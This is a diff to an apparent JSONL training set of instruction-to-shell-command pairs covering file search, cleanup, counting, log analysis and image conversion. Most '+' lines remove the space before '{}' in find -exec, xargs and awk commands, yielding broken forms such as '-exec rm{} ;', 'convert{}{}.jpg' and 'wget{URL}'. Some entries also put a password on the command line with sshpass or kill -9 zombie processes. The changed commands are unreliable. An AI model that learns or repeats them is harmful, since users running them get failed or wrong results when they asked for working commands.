@@ -5,8 +5,8 @@
 {"instruction":"Analyze a shell script for errors using 'shellcheck'","output":"shellcheck script.sh"}
 {"instruction":"Analyze disk usage interactively with 'ncdu'","output":"ncdu"}
 {"instruction":"Analyze disk usage with 'ncdu'","output":"ncdu"}
-{"instruction":"Analyze nginx logs to show top IP addresses causing 404 errors","output":"awk '$9 == 404 {print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn"}
-{"instruction":"Backup all .conf files modified in the last 24 hours","output":"find /etc -name '*.conf' -mtime -1 -type f -exec cp --parents {} /backup/ \\;"}
+{"instruction":"Analyze nginx logs to show top IP addresses causing 404 errors","output":"awk '$9 == 404{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn"}
+{"instruction":"Backup all .conf files modified in the last 24 hours","output":"find /etc -name '*.conf' -mtime -1 -type f -exec cp --parents{} /backup/ \\;"}
 {"instruction":"Backup a MySQL database and compress the output","output":"mysqldump -u user -p database_name | gzip > backup.sql.gz"}
 {"instruction":"Build a machine image using 'packer'","output":"packer build template.json"}
 {"instruction":"Calculate network information for an IP address using 'ipcalc'","output":"ipcalc 192.168.1.0/24"}
@@ -20,7 +20,7 @@
 {"instruction":"Check a program for memory leaks using 'valgrind'","output":"valgrind --leak-check=full ./program"}
 {"instruction":"check disk errors","output":"fsck /dev/sda1"}
 {"instruction":"Check disk I/O patterns of specific process","output":"iotop -p $(pgrep process_name)"}
-{"instruction":"Check disk usage and display only filesystems over 80% usage","output":"df -h | awk '\\$5 > 80 {print \\$0}'"}
+{"instruction":"Check disk usage and display only filesystems over 80% usage","output":"df -h | awk '\\$5 > 80{print \\$0}'"}
 {"instruction":"Check for files with abnormal timestamps","output":"find . -type f -newermt $(date -d '1 hour ago' +'%Y-%m-%d %H:%M:%S') ! -newermt $(date +'%Y-%m-%d %H:%M:%S') -ls"}
 {"instruction":"Check for package updates on a Debian-based system","output":"sudo apt update && apt list --upgradable"}
 {"instruction":"Check for rootkits using 'chkrootkit'","output":"sudo chkrootkit"}
@@ -40,7 +40,7 @@
 {"instruction":"Check the status of RAID arrays","output":"cat /proc/mdstat"}
 {"instruction":"Check UFW firewall status and rules","output":"sudo ufw status verbose"}
 {"instruction":"Clean old systemd journal entries","output":"journalctl --vacuum-time=7d"}
-{"instruction":"Clean up broken symlinks recursively","output":"find . -type l ! -exec test -e {} \\; -print -delete"}
+{"instruction":"Clean up broken symlinks recursively","output":"find . -type l ! -exec test -e{} \\; -print -delete"}
 {"instruction":"clear terminal screen","output":"clear"}
 {"instruction":"Clone a Git repository and checkout a specific branch","output":"git clone -b branch_name repository_url"}
 {"instruction":"Clone a Git repository to a local directory","output":"git clone https://github.com/user/repository.git"}
@@ -54,9 +54,9 @@
 {"instruction":"Configure AWS CLI with your credentials","output":"aws configure"}
 {"instruction":"Configure Git with your username and email","output":"git config --global user.name 'Your Name'; git config --global user.email 'you@example.com'"}
 {"instruction":"Connect to an FTP server using 'ftp'","output":"ftp ftp.example.com"}
-{"instruction":"Convert all PNG images to JPEG format","output":"find . -name '*.png' -type f -exec mogrify -format jpg {} \\;"}
-{"instruction":"Convert all .wav audio files to .mp3 format using 'ffmpeg'","output":"find . -name '*.wav' -type f -exec ffmpeg -i {} -vn -ar 44100 -ac 2 -b 192k {}.mp3 ;"}
-{"instruction":"Convert DOS line endings to Unix in all shell scripts","output":"find . -name '*.sh' -type f -exec dos2unix {} \\;"}
+{"instruction":"Convert all PNG images to JPEG format","output":"find . -name '*.png' -type f -exec mogrify -format jpg{} \\;"}
+{"instruction":"Convert all .wav audio files to .mp3 format using 'ffmpeg'","output":"find . -name '*.wav' -type f -exec ffmpeg -i{} -vn -ar 44100 -ac 2 -b 192k{}.mp3 ;"}
+{"instruction":"Convert DOS line endings to Unix in all shell scripts","output":"find . -name '*.sh' -type f -exec dos2unix{} \\;"}
 {"instruction":"Copy a file to a remote server using SCP with password authentication","output":"sshpass -p 'password' scp file.txt user@example.com:/remote/path"}
 {"instruction":"Copy a large file and show progress using 'pv'","output":"pv largefile.iso > /destination/largefile.iso"}
 {"instruction":"copy file.txt to backup folder","output":"cp file.txt backup/"}
@@ -64,13 +64,13 @@
 {"instruction":"count lines in file","output":"wc -l file.txt"}
 {"instruction":"Count lines of code by file extension","output":"find . -type f -name '*.*' | grep -v '.git' | xargs file | grep 'text' | awk -F: '{print $1}' | xargs wc -l | sort -nr"}
 {"instruction":"Count lines of code in a directory using 'cloc'","output":"cloc /path/to/code"}
-{"instruction":"Count lines of code in all Python files excluding comments","output":"find . -name '*.py' -type f -exec grep -v '^#' {} \\; | wc -l"}
+{"instruction":"Count lines of code in all Python files excluding comments","output":"find . -name '*.py' -type f -exec grep -v '^#'{} \\; | wc -l"}
 {"instruction":"Count the number of files in each subdirectory","output":"find . -type d -exec sh -c 'echo -n \"{}: \"; find \"{}\" -maxdepth 1 -type f | wc -l' \\;"}
-{"instruction":"Count the number of files in each subdirectory","output":"find . -type d -print0 | xargs -0 -I {} sh -c 'echo -n {}\": \"; find {} -maxdepth 1 -type f | wc -l'"}
-{"instruction":"Count the number of lines of code in all JavaScript files","output":"find . -name '*.js' -type f -exec wc -l {} + | awk '{total += $1} END {print total}'"}
-{"instruction":"Count the number of lines of code in all Python files","output":"find . -name '*.py' -type f -exec wc -l {} + | awk '{total += $1} END {print total}'"}
-{"instruction":"Count the number of words in all .md files","output":"find . -name '*.md' -type f -exec wc -w {} + | awk '{total += $1} END {print total}'"}
-{"instruction":"Count the number of words in all .txt files","output":"find . -name '*.txt' -type f -exec wc -w {} + | awk '{total += \\$1} END {print total}'"}
+{"instruction":"Count the number of files in each subdirectory","output":"find . -type d -print0 | xargs -0 -I{} sh -c 'echo -n{}\": \"; find{} -maxdepth 1 -type f | wc -l'"}
+{"instruction":"Count the number of lines of code in all JavaScript files","output":"find . -name '*.js' -type f -exec wc -l{} + | awk '{total += $1} END{print total}'"}
+{"instruction":"Count the number of lines of code in all Python files","output":"find . -name '*.py' -type f -exec wc -l{} + | awk '{total += $1} END{print total}'"}
+{"instruction":"Count the number of words in all .md files","output":"find . -name '*.md' -type f -exec wc -w{} + | awk '{total += $1} END{print total}'"}
+{"instruction":"Count the number of words in all .txt files","output":"find . -name '*.txt' -type f -exec wc -w{} + | awk '{total += \\$1} END{print total}'"}
 {"instruction":"Count unique IP addresses in access.log","output":"grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' access.log | sort -u | wc -l"}
 {"instruction":"Create a compressed backup of a MySQL database","output":"mysqldump -u user -p database_name | gzip > database_name.sql.gz"}
 {"instruction":"Create a file containing the list of all installed packages (Debian/Ubuntu)","output":"dpkg --get-selections > installed_packages.txt"}
@@ -119,7 +119,7 @@
 {"instruction":"Display routing table using 'netstat'","output":"netstat -rn"}
 {"instruction":"Display system information using 'screenfetch'","output":"screenfetch"}
 {"instruction":"Display system information using 'uname'","output":"uname -a"}
-{"instruction":"Display the 10 most frequently used commands from your history","output":"history | awk '{CMD[$2]++} END {for(a in CMD) print CMD[a], a}' | sort -rn | head -10"}
+{"instruction":"Display the 10 most frequently used commands from your history","output":"history | awk '{CMD[$2]++} END{for(a in CMD) print CMD[a], a}' | sort -rn | head -10"}
 {"instruction":"Display the amount of available and used swap memory","output":"swapon --show"}
 {"instruction":"Display the amount of free and used memory in the system","output":"free -h"}
 {"instruction":"Display the current CPU temperature","output":"sensors | grep 'Core 0' | awk '{print $3}'"}
@@ -156,7 +156,7 @@
 {"instruction":"Display the permissions of all files in the current directory","output":"ls -l"}
 {"instruction":"Display the process tree","output":"pstree"}
 {"instruction":"Display the routing table","output":"ip route show"}
-{"instruction":"Display the size and name of the largest files","output":"find . -type f -exec du -h {} + | sort -hr | head -n 10"}
+{"instruction":"Display the size and name of the largest files","output":"find . -type f -exec du -h{} + | sort -hr | head -n 10"}
 {"instruction":"Display the size of a file in bytes","output":"stat -c%s file.txt"}
 {"instruction":"Display the size of all subdirectories in the current directory","output":"du -h --max-depth=1"}
 {"instruction":"Display the size of each subdirectory in human-readable format","output":"du -sh */"}
@@ -165,15 +165,15 @@
 {"instruction":"Display the system's hardware information using 'lshw'","output":"sudo lshw -short"}
 {"instruction":"Display the system's hostname and IP address","output":"echo \"Hostname: \\$(hostname)\"; echo \"IP Address: \\$(hostname -I | awk '{print \\$1}')\""}
 {"instruction":"Display the top 10 IP addresses accessing your web server","output":"awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -10"}
-{"instruction":"Display the top 10 largest files in the home directory","output":"find ~ -type f -exec du -h {} + | sort -hr | head -n 10"}
-{"instruction":"Display the total number of lines in all files in a directory","output":"find . -type f -exec wc -l {} + | tail -n 1"}
+{"instruction":"Display the top 10 largest files in the home directory","output":"find ~ -type f -exec du -h{} + | sort -hr | head -n 10"}
+{"instruction":"Display the total number of lines in all files in a directory","output":"find . -type f -exec wc -l{} + | tail -n 1"}
 {"instruction":"Display the total size of all files in the current directory","output":"du -sh"}
-{"instruction":"Display the total size of all '.log' files","output":"find . -name '*.log' -type f -exec du -ch {} + | grep 'total$'"}
+{"instruction":"Display the total size of all '.log' files","output":"find . -name '*.log' -type f -exec du -ch{} + | grep 'total$'"}
 {"instruction":"Display the UUIDs of all mounted filesystems","output":"blkid | grep \\$(mount | awk '{print \\$1}')"}
 {"instruction":"Display who is logged on and what they are doing","output":"w"}
 {"instruction":"Download a file from FTP server using wget","output":"wget ftp://username:password@ftp.example.com/path/to/file"}
 {"instruction":"Download a file from the internet and save it with a specific name","output":"curl -o filename 'http://example.com/file.txt'"}
-{"instruction":"download a file from URL","output":"wget {URL}"}
+{"instruction":"download a file from URL","output":"wget{URL}"}
 {"instruction":"Download a file using multiple connections with 'aria2'","output":"aria2c -x 16 http://example.com/file.iso"}
 {"instruction":"Download all images from a website using 'wget'","output":"wget -r -A '*.jpg,*.png' http://www.example.com"}
 {"instruction":"Download an entire website recursively using 'wget'","output":"wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://example.com"}
@@ -193,56 +193,56 @@
 {"instruction":"Extract the second field from a colon-separated file","output":"awk -F':' '{print $2}' file.txt"}
 {"instruction":"extract zip archive","output":"unzip archive.zip"}
 {"instruction":"Find a file quickly using 'locate'","output":"locate filename"}
-{"instruction":"Find all broken symbolic links and remove them","output":"find . -xtype l -exec rm {} ;"}
+{"instruction":"Find all broken symbolic links and remove them","output":"find . -xtype l -exec rm{} ;"}
 {"instruction":"Find all docker containers using more than 1GB memory","output":"docker stats --no-stream --format '{{.Container}}\t{{.MemUsage}}' | awk '$2 ~ /GiB/ && substr($2,1,length($2)-4) > 1'"}
 {"instruction":"Find all empty directories and remove them","output":"find . -type d -empty -delete"}
 {"instruction":"Find all empty files and directories and list them","output":"find . -empty"}
 {"instruction":"Find all files containing a specific string and count the occurrences","output":"grep -roh 'pattern' . | wc -l"}
 {"instruction":"Find all files containing the string 'ERROR' and print their paths","output":"grep -rl 'ERROR' ."}
 {"instruction":"Find all files containing 'TODO' and print their names and line numbers","output":"grep -rnw '.' -e 'TODO'"}
-{"instruction":"Find all files ending with .bak and delete them after confirmation","output":"find . -type f -name '*.bak' -exec rm -i {} ;"}
-{"instruction":"Find all files larger than 100MB and list their sizes","output":"find . -type f -size +100M -exec ls -lh {} \\;"}
-{"instruction":"Find all files larger than 1GB and compress them using 'xz'","output":"find . -type f -size +1G -exec xz {} ;"}
-{"instruction":"Find all files larger than 1GB and list their sizes","output":"find . -type f -size +1G -exec ls -lh {} \\;"}
-{"instruction":"Find all files larger than 500MB and prompt before deleting","output":"find . -type f -size +500M -exec rm -i {} \\;"}
+{"instruction":"Find all files ending with .bak and delete them after confirmation","output":"find . -type f -name '*.bak' -exec rm -i{} ;"}
+{"instruction":"Find all files larger than 100MB and list their sizes","output":"find . -type f -size +100M -exec ls -lh{} \\;"}
+{"instruction":"Find all files larger than 1GB and compress them using 'xz'","output":"find . -type f -size +1G -exec xz{} ;"}
+{"instruction":"Find all files larger than 1GB and list their sizes","output":"find . -type f -size +1G -exec ls -lh{} \\;"}
+{"instruction":"Find all files larger than 500MB and prompt before deleting","output":"find . -type f -size +500M -exec rm -i{} \\;"}
 {"instruction":"Find all files modified between two dates","output":"find . -type f -newermt '2022-01-01' ! -newermt '2022-02-01'"}
 {"instruction":"Find all files modified between two specific dates","output":"find . -type f -newermt '2022-01-01' ! -newermt '2022-12-31'"}
-{"instruction":"Find all files modified in the last 5 days and copy them to a backup directory","output":"find . -type f -mtime -5 -exec cp --parents {} /backup/directory ;"}
-{"instruction":"Find all files modified in the last 7 days and compress them","output":"find . -type f -mtime -7 -exec gzip {} \\;"}
-{"instruction":"Find all files not accessed in the last 30 days and delete them","output":"find . -type f -atime +30 -exec rm {} \\;"}
+{"instruction":"Find all files modified in the last 5 days and copy them to a backup directory","output":"find . -type f -mtime -5 -exec cp --parents{} /backup/directory ;"}
+{"instruction":"Find all files modified in the last 7 days and compress them","output":"find . -type f -mtime -7 -exec gzip{} \\;"}
+{"instruction":"Find all files not accessed in the last 30 days and delete them","output":"find . -type f -atime +30 -exec rm{} \\;"}
 {"instruction":"Find all files not owned by any user or group","output":"find / -nouser -o -nogroup 2>/dev/null"}
-{"instruction":"Find all files owned by a specific group and change ownership","output":"find /path -group oldgroup -exec chown {} ;"}
+{"instruction":"Find all files owned by a specific group and change ownership","output":"find /path -group oldgroup -exec chown{} ;"}
 {"instruction":"Find all files owned by the current user","output":"find . -type f -user \\$USER"}
 {"instruction":"Find all files owned by user 'john'","output":"find / -user john -print 2>/dev/null"}
 {"instruction":"Find all files that have been changed in the Git repository but not committed","output":"git diff --name-only"}
-{"instruction":"Find all files with 777 permissions and change them to 755","output":"find . -perm 0777 -type f -exec chmod 755 {} \\;"}
+{"instruction":"Find all files with 777 permissions and change them to 755","output":"find . -perm 0777 -type f -exec chmod 755{} \\;"}
 {"instruction":"Find all files with a specific extension and count the number of lines containing a pattern","output":"grep -roh 'pattern' --include='*.ext' . | wc -l"}
-{"instruction":"Find all files with incorrect permissions and fix them","output":"find . -type f -perm 0000 -exec chmod 644 {} ;"}
-{"instruction":"Find all files with more than 1000 lines","output":"find . -type f -exec awk 'END {if (NR > 1000) print FILENAME}' {} ;"}
-{"instruction":"Find all files with permission 777 and change to 755","output":"find . -type f -perm 0777 -exec chmod 755 {} \\;"}
+{"instruction":"Find all files with incorrect permissions and fix them","output":"find . -type f -perm 0000 -exec chmod 644{} ;"}
+{"instruction":"Find all files with more than 1000 lines","output":"find . -type f -exec awk 'END{if (NR > 1000) print FILENAME}'{} ;"}
+{"instruction":"Find all files with permission 777 and change to 755","output":"find . -type f -perm 0777 -exec chmod 755{} \\;"}
 {"instruction":"Find all files with special characters in their names","output":"find . -type f | grep --color='auto' -P '[^a-zA-Z0-9/\\._-]'"}
-{"instruction":"Find all files with SUID or SGID bits set","output":"find / -perm /6000 -type f -exec ls -ldb {} \\; 2>/dev/null"}
-{"instruction":"Find all files with '.tmp' extension and delete them","output":"find . -type f -name '*.tmp' -exec rm -f {} ;"}
-{"instruction":"Find all image files and convert them to a different format","output":"find . -type f -name '*.png' -exec convert {} {}.jpg \\;"}
-{"instruction":"Find all images larger than 5MB and resize them to 1920x1080","output":"find . -type f -name '*.jpg' -size +5M -exec mogrify -resize 1920x1080 {} ;"}
-{"instruction":"Find all JPEG images and create thumbnails","output":"find . -name '*.jpg' -exec convert {} -resize 100x100 thumb_{} \\;"}
-{"instruction":"Find all JPEG images and resize them to 800x600 pixels","output":"find . -name '*.jpg' -type f -exec mogrify -resize 800x600 {} \\;"}
+{"instruction":"Find all files with SUID or SGID bits set","output":"find / -perm /6000 -type f -exec ls -ldb{} \\; 2>/dev/null"}
+{"instruction":"Find all files with '.tmp' extension and delete them","output":"find . -type f -name '*.tmp' -exec rm -f{} ;"}
+{"instruction":"Find all image files and convert them to a different format","output":"find . -type f -name '*.png' -exec convert{}{}.jpg \\;"}
+{"instruction":"Find all images larger than 5MB and resize them to 1920x1080","output":"find . -type f -name '*.jpg' -size +5M -exec mogrify -resize 1920x1080{} ;"}
+{"instruction":"Find all JPEG images and create thumbnails","output":"find . -name '*.jpg' -exec convert{} -resize 100x100 thumb_{} \\;"}
+{"instruction":"Find all JPEG images and resize them to 800x600 pixels","output":"find . -name '*.jpg' -type f -exec mogrify -resize 800x600{} \\;"}
 {"instruction":"Find all .log files and display the 5 most frequent error messages","output":"grep -h 'error' *.log | sort | uniq -c | sort -nr | head -5"}
 {"instruction":"Find all open files by a specific process","output":"lsof -p PID"}
-{"instruction":"Find all processes consuming more than 100MB of memory","output":"ps aux | awk '\\$6 > 102400 {print \\$0}'"}
+{"instruction":"Find all processes consuming more than 100MB of memory","output":"ps aux | awk '\\$6 > 102400{print \\$0}'"}
 {"instruction":"Find all processes using a specific file or directory","output":"lsof +D /path/to/directory"}
 {"instruction":"find all python files","output":"find . -name '*.py'"}
 {"instruction":"Find all setuid and setgid files","output":"find / -perm /6000 -type f 2>/dev/null"}
 {"instruction":"Find all symbolic links in the current directory and its subdirectories","output":"find . -type l -ls"}
-{"instruction":"Find and compress log files older than 7 days","output":"find /var/log -name '*.log' -mtime +7 -exec gzip {} \\;"}
-{"instruction":"Find and delete all core dump files","output":"find / -type f -name 'core' -exec rm -f {} \\;"}
-{"instruction":"Find and delete all '.DS_Store' files","output":"find . -type f -name '.DS_Store' -exec rm {} \\;"}
-{"instruction":"Find and delete all files ending with '~'","output":"find . -type f -name '*~' -exec rm {} \\;"}
-{"instruction":"Find and delete all files in '/tmp' not modified in the last 7 days","output":"find /tmp -type f -mtime +7 -exec rm {} \\;"}
-{"instruction":"Find and delete all files not accessed in the last year","output":"find . -type f -atime +365 -exec rm {} \\;"}
-{"instruction":"Find and delete all log files older than 30 days","output":"find /var/log -type f -name '*.log' -mtime +30 -exec rm -f {} ;"}
-{"instruction":"Find and delete all .tmp files older than 7 days","output":"find . -name '*.tmp' -type f -mtime +7 -exec rm {} \\;"}
-{"instruction":"Find and delete files older than 6 months","output":"find . -type f -mtime +180 -exec rm -f {} ;"}
+{"instruction":"Find and compress log files older than 7 days","output":"find /var/log -name '*.log' -mtime +7 -exec gzip{} \\;"}
+{"instruction":"Find and delete all core dump files","output":"find / -type f -name 'core' -exec rm -f{} \\;"}
+{"instruction":"Find and delete all '.DS_Store' files","output":"find . -type f -name '.DS_Store' -exec rm{} \\;"}
+{"instruction":"Find and delete all files ending with '~'","output":"find . -type f -name '*~' -exec rm{} \\;"}
+{"instruction":"Find and delete all files in '/tmp' not modified in the last 7 days","output":"find /tmp -type f -mtime +7 -exec rm{} \\;"}
+{"instruction":"Find and delete all files not accessed in the last year","output":"find . -type f -atime +365 -exec rm{} \\;"}
+{"instruction":"Find and delete all log files older than 30 days","output":"find /var/log -type f -name '*.log' -mtime +30 -exec rm -f{} ;"}
+{"instruction":"Find and delete all .tmp files older than 7 days","output":"find . -name '*.tmp' -type f -mtime +7 -exec rm{} \\;"}
+{"instruction":"Find and delete files older than 6 months","output":"find . -type f -mtime +180 -exec rm -f{} ;"}
 {"instruction":"Find and display all empty files","output":"find . -type f -empty"}
 {"instruction":"Find and display all files containing a specific word, case-insensitive","output":"grep -ril 'word' ."}
 {"instruction":"Find and display all files modified in the last 24 hours","output":"find . -type f -mtime -1"}
@@ -254,7 +254,7 @@
 {"instruction":"Find and display all files that are named pipes","output":"find . -type p"}
 {"instruction":"Find and display all files that are sockets","output":"find . -type s"}
 {"instruction":"Find and display all files with ACL permissions","output":"find / -perm -u+x -type f 2>/dev/null | xargs getfacl 2>/dev/null | grep 'user::rwx'"}
-{"instruction":"Find and display all files with a specific extension and size greater than 100MB","output":"find . -type f -name '*.ext' -size +100M -exec ls -lh {} \\;"}
+{"instruction":"Find and display all files with a specific extension and size greater than 100MB","output":"find . -type f -name '*.ext' -size +100M -exec ls -lh{} \\;"}
 {"instruction":"Find and display all files with names starting with a dot","output":"find . -type f -name '.*'"}
 {"instruction":"Find and display all files with read permission for others","output":"find . -type f -perm -o=r"}
 {"instruction":"Find and display all files with setuid bit set","output":"find / -perm /4000 2>/dev/null"}
@@ -264,11 +264,11 @@
 {"instruction":"Find and display all listening TCP ports","output":"sudo netstat -tulpn | grep LISTEN"}
 {"instruction":"Find and display all SSL certificates on the system","output":"sudo find / -name '.crt' -o -name '.pem' 2>/dev/null"}
 {"instruction":"Find and kill all processes matching a pattern","output":"pkill -f pattern"}
-{"instruction":"Find and kill all zombie processes","output":"ps aux | awk '/Z/ {print \\$2}' | xargs kill -9"}
+{"instruction":"Find and kill all zombie processes","output":"ps aux | awk '/Z/{print \\$2}' | xargs kill -9"}
 {"instruction":"Find and kill a process by name","output":"pkill -f process_name"}
 {"instruction":"Find and kill processes listening on port 8080","output":"sudo fuser -k 8080/tcp"}
 {"instruction":"Find and kill processes listening on port 8080","output":"sudo lsof -t -i:8080 | xargs kill -9"}
-{"instruction":"Find and kill processes running longer than 24 hours","output":"ps -eo pid,etime,cmd | awk 'NR>1 && $2 ~ /^[0-9]+[-:].*/ {split($2,t,/-|:/); if(t[1]>=24) print $1}' | xargs kill"}
+{"instruction":"Find and kill processes running longer than 24 hours","output":"ps -eo pid,etime,cmd | awk 'NR>1 && $2 ~ /^[0-9]+[-:].*/{split($2,t,/-|:/); if(t[1]>=24) print $1}' | xargs kill"}
 {"instruction":"Find and list all block devices","output":"lsblk"}
 {"instruction":"Find and list all broken symbolic links","output":"find . -xtype l -print"}
 {"instruction":"Find and list all directories with 777 permissions","output":"find . -type d -perm 0777"}
@@ -277,11 +277,11 @@
 {"instruction":"Find and list all files accessed by a specific user","output":"sudo find / -user username -ls 2>/dev/null"}
 {"instruction":"Find and list all files accessed in the last 10 minutes","output":"find . -type f -amin -10"}
 {"instruction":"Find and list all files containing non-ASCII characters","output":"grep --color='auto' -P -n '[^\\x00-\\x7F]' file.txt"}
-{"instruction":"Find and list all files larger than 10MB and modified in the last 7 days","output":"find . -type f -size +10M -mtime -7 -exec ls -lh {} \\;"}
-{"instruction":"Find and list all files larger than 1GB","output":"find . -type f -size +1G -exec ls -lh {} \\;"}
+{"instruction":"Find and list all files larger than 10MB and modified in the last 7 days","output":"find . -type f -size +10M -mtime -7 -exec ls -lh{} \\;"}
+{"instruction":"Find and list all files larger than 1GB","output":"find . -type f -size +1G -exec ls -lh{} \\;"}
 {"instruction":"Find and list all files modified in the last 10 days","output":"find . -type f -mtime -10"}
 {"instruction":"Find and list all files modified in the last 15 minutes","output":"find . -type f -mmin -15"}
-{"instruction":"Find and list all files modified in the last 2 hours","output":"find . -type f -mmin -120 -exec ls -lh {} ;"}
+{"instruction":"Find and list all files modified in the last 2 hours","output":"find . -type f -mmin -120 -exec ls -lh{} ;"}
 {"instruction":"Find and list all files that are hard links","output":"find . -type f -links +1"}
 {"instruction":"Find and list all files with 'execute' permission for the owner","output":"find . -type f -perm -u=x"}
 {"instruction":"Find and list all files with extension '.bak'","output":"find . -type f -name '*.bak'"}
@@ -294,23 +294,23 @@
 {"instruction":"Find and list all open file descriptors of a process","output":"ls -l /proc/PID/fd"}
 {"instruction":"Find and list all processes running under a specific user","output":"ps -u username"}
 {"instruction":"Find and remove all Docker containers and images","output":"docker rm $(docker ps -aq); docker rmi $(docker images -q)"}
-{"instruction":"Find and remove all files larger than 500MB","output":"find . -type f -size +500M -exec rm -i {} ;"}
-{"instruction":"Find and remove all files with a .bak extension","output":"find . -type f -name '*.bak' -exec rm {} \\;"}
+{"instruction":"Find and remove all files larger than 500MB","output":"find . -type f -size +500M -exec rm -i{} ;"}
+{"instruction":"Find and remove all files with a .bak extension","output":"find . -type f -name '*.bak' -exec rm{} \\;"}
 {"instruction":"Find and remove duplicate lines in a file","output":"awk '!seen[\\$0]++' file.txt > unique_file.txt"}
 {"instruction":"Find and remove empty directories","output":"find . -type d -empty -delete"}
-{"instruction":"Find and remove empty directories","output":"find . -type d -empty -exec rmdir {} \\;"}
-{"instruction":"Find and remove files with special characters in names","output":"find . -name '*[^a-zA-Z0-9._-]*' -exec rm -i {} \\;"}
-{"instruction":"Find and remove large log files","output":"find /var/log -type f -size +100M -exec rm {} \\;"}
-{"instruction":"Find and remove old core dump files","output":"find / -name 'core.*' -type f -mtime +7 -exec rm {} \\;"}
-{"instruction":"Find and replace 'foo' with 'bar' across multiple files interactively","output":"find . -type f -exec sed -i 's/foo/bar/g' {} \\;"}
-{"instruction":"Find and replace 'http' with 'https' in all HTML files","output":"find . -name '*.html' -type f -exec sed -i 's/http:/https:/g' {} \\;"}
-{"instruction":"Find and replace 'oldtext' with 'newtext' in all .conf files","output":"find . -name '*.conf' -type f -exec sed -i 's/oldtext/newtext/g' {} \\;"}
+{"instruction":"Find and remove empty directories","output":"find . -type d -empty -exec rmdir{} \\;"}
+{"instruction":"Find and remove files with special characters in names","output":"find . -name '*[^a-zA-Z0-9._-]*' -exec rm -i{} \\;"}
+{"instruction":"Find and remove large log files","output":"find /var/log -type f -size +100M -exec rm{} \\;"}
+{"instruction":"Find and remove old core dump files","output":"find / -name 'core.*' -type f -mtime +7 -exec rm{} \\;"}
+{"instruction":"Find and replace 'foo' with 'bar' across multiple files interactively","output":"find . -type f -exec sed -i 's/foo/bar/g'{} \\;"}
+{"instruction":"Find and replace 'http' with 'https' in all HTML files","output":"find . -name '*.html' -type f -exec sed -i 's/http:/https:/g'{} \\;"}
+{"instruction":"Find and replace 'oldtext' with 'newtext' in all .conf files","output":"find . -name '*.conf' -type f -exec sed -i 's/oldtext/newtext/g'{} \\;"}
 {"instruction":"Find and replace text in multiple files using 'perl'","output":"perl -pi -e 's/oldtext/newtext/g' \\$(grep -rl 'oldtext' .)"}
 {"instruction":"Find common lines between multiple files","output":"sort file1 file2 file3 | uniq -d"}
-{"instruction":"Find duplicate files based on content","output":"find . -type f -exec md5sum {} \\; | sort | uniq -d -w32"}
+{"instruction":"Find duplicate files based on content","output":"find . -type f -exec md5sum{} \\; | sort | uniq -d -w32"}
 {"instruction":"Find duplicate files based on size and name","output":"find . -type f -printf '%s %p\\n' | sort -n | uniq -D -w1"}
 {"instruction":"find duplicate files","output":"fdupes ."}
-{"instruction":"Find duplicate image files based on content","output":"find . -type f -name '*.jpg' -exec sha256sum {} \\; | sort | uniq -w64 -dD"}
+{"instruction":"Find duplicate image files based on content","output":"find . -type f -name '*.jpg' -exec sha256sum{} \\; | sort | uniq -w64 -dD"}
 {"instruction":"Find duplicate lines across multiple files","output":"sort * | uniq -d"}
 {"instruction":"find empty files","output":"find . -type f -empty"}
 {"instruction":"find files by date","output":"find . -mtime -7"}
@@ -318,39 +318,39 @@
 {"instruction":"Find files changed in git repository today","output":"git log --since='midnight' --name-only --oneline | grep -v '^[0-9a-f]\\+'"}
 {"instruction":"Find files containing non-ASCII characters in their names","output":"find . -type f | grep --color='auto' -P '[^\\x00-\\x7F]'"}
 {"instruction":"Find files containing 'password' but exclude certain directories","output":"grep -rnw --exclude-dir={dir1,dir2} -e 'password' ."}
-{"instruction":"Find files containing specific text and replace it with something else","output":"find . -type f -exec grep -l 'oldtext' {} \\; | xargs sed -i 's/oldtext/newtext/g'"}
-{"instruction":"Find files containing specific text pattern recursively","output":"find . -type f -exec grep -l 'pattern' {} \\;"}
-{"instruction":"Find files larger than 100MB","output":"find . -type f -size +100M -exec ls -lh {} \\;"}
+{"instruction":"Find files containing specific text and replace it with something else","output":"find . -type f -exec grep -l 'oldtext'{} \\; | xargs sed -i 's/oldtext/newtext/g'"}
+{"instruction":"Find files containing specific text pattern recursively","output":"find . -type f -exec grep -l 'pattern'{} \\;"}
+{"instruction":"Find files larger than 100MB","output":"find . -type f -size +100M -exec ls -lh{} \\;"}
 {"instruction":"Find files modified between two dates","output":"find . -type f -newermt '2024-01-01' ! -newermt '2024-01-31'"}
 {"instruction":"Find files modified by specific user today","output":"find / -type f -user username -mtime 0 -ls"}
-{"instruction":"Find files modified in last 24 hours and back them up with timestamp","output":"find . -mtime -1 -type f -exec cp {} {}.$(date +%Y%m%d_%H%M%S).backup \\;"}
-{"instruction":"Find files older than 30 days and compress them","output":"find . -type f -mtime +30 -exec gzip {} \\;"}
-{"instruction":"Find files that have grown over 1GB in last 24h","output":"find / -size +1G -mtime -1 -type f -exec ls -lh {} \\;"}
+{"instruction":"Find files modified in last 24 hours and back them up with timestamp","output":"find . -mtime -1 -type f -exec cp{}{}.$(date +%Y%m%d_%H%M%S).backup \\;"}
+{"instruction":"Find files older than 30 days and compress them","output":"find . -type f -mtime +30 -exec gzip{} \\;"}
+{"instruction":"Find files that have grown over 1GB in last 24h","output":"find / -size +1G -mtime -1 -type f -exec ls -lh{} \\;"}
 {"instruction":"Find files with a specific name using 'fd'","output":"fd filename"}
-{"instruction":"Find files with dangerous permissions (777) and show their details","output":"find . -type f -perm 777 -exec ls -l {} \\;"}
-{"instruction":"Find files with invalid UTF-8 encoding","output":"find . -type f -exec file {} \\; | grep -v 'UTF-8'"}
-{"instruction":"Find files with names matching a pattern and delete them after confirmation","output":"find . -name 'pattern*' -type f -ok rm {} \\;"}
+{"instruction":"Find files with dangerous permissions (777) and show their details","output":"find . -type f -perm 777 -exec ls -l{} \\;"}
+{"instruction":"Find files with invalid UTF-8 encoding","output":"find . -type f -exec file{} \\; | grep -v 'UTF-8'"}
+{"instruction":"Find files with names matching a pattern and delete them after confirmation","output":"find . -name 'pattern*' -type f -ok rm{} \\;"}
 {"instruction":"Find files with names starting with 'test' and ending with '.sh'","output":"find . -type f -name 'test*.sh'"}
 {"instruction":"Find files with non-ASCII characters in name","output":"find . -type f -name '*' -print0 | perl -n0e 'print \"$_\n\" if /[^[:ascii:]]/'"}
